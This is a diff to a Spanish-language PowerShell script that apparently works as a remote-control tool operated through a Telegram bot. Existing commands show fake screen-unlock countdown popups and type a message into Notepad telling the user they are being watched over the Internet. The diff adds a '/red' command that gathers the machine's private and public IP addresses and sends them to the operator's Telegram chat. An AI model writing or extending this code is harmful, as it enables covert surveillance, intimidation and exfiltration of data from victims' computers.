@@ -95,7 +95,7 @@ while ($true) {
                         
                         "/cuenta" {
                             $wsh = New-Object -ComObject WScript.Shell
-                            for ($i = 10; $i -gt 0; $i--) {
+                            for ($i = 15; $i -gt 0; $i--) {
                                 $wsh.Popup("Faltan $i segundos para desbloquear la pantalla.", 1, "Cuenta Regresiva", 0 + 48 + 4096)
                             }
                         }
@@ -107,6 +107,24 @@ while ($true) {
                             $wsh.SendKeys("Te estoy observando por Internet... 👀")
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
                         }
+                   "/red" {
+                     # 1. Obtener la IP Privada (Filtra solo adaptadores reales IPv4 activos)
+    $IpPrivada = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" -and $_.InterfaceAlias -notlike "*Virtual*" -and $_.IPAddress -notlike "127.*" }).IPAddress | Select-Object -First 1
+
+    # 2. Obtener la IP Pública (Usando un servicio externo oficial y estable)
+    $IpPublica = "Desconocida"
+    try {
+        $IpPublica = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5).Trim()
+    } catch {}
+
+    # 3. Formatear y enviar respuesta al bot de Telegram
+    $ReporteRed = "📊 REPORTE DE RED (ID: " + $MiIDNum + ")`n" +
+                  "🏠 IP Privada (Local): " + $IpPrivada + "`n" +
+                  "🌍 IP Pública (Internet): " + $IpPublica
+                  
+    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $ReporteRed })
+    continue
+
                     }
                 }
             }
